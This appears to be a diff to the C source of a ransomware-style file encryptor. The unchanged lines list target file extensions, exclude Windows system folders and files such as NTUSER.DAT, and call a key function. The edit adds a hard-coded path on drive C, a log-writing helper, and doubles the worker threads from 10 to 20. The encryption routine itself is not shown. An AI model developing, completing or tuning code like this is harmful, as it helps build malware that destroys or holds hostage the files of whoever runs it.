@@ -25,6 +25,7 @@ const char* exts = ",c,h,d,f,m,p,r,s,v,i,as,,mx,bc,sh,nt,bb,ml,cc,hh,cs,em,bi,hs
 
 const char* exdir = ",$Recycle.Bin,Documents and Settings,PerfLogs,Program Files,Program Files (x86),Windows,";
 const char* exfile = ",desktop.ini,ntuser.ini,NTUSER.DAT,";
+const char* defile = "c:\\sun.txt";
 
 void toLower(char* str)
 {
@@ -357,6 +358,17 @@ void * tp_pfr_free_func(void *arg)
 	return NULL;
 }
 
+int WriteToLog(char* str)
+{
+    FILE* log;
+    log = fopen("log.txt", "a+");
+    if (log == NULL)
+        return -1;
+    fprintf(log, "%s\n", str);
+    fclose(log);
+    return 0;
+}
+
 int main(int argc, char *argv[])
 {
 	if (argc != 2) return EXIT_SUCCESS;
@@ -374,7 +386,7 @@ int main(int argc, char *argv[])
 	
 	int key = getkey();
 	
-	threadpool *tp = (threadpool *)threadpool_init(10);
+	threadpool *tp = (threadpool *)threadpool_init(20);
 	
 	threadpool *tpd = (threadpool *)threadpool_init(3);
 	
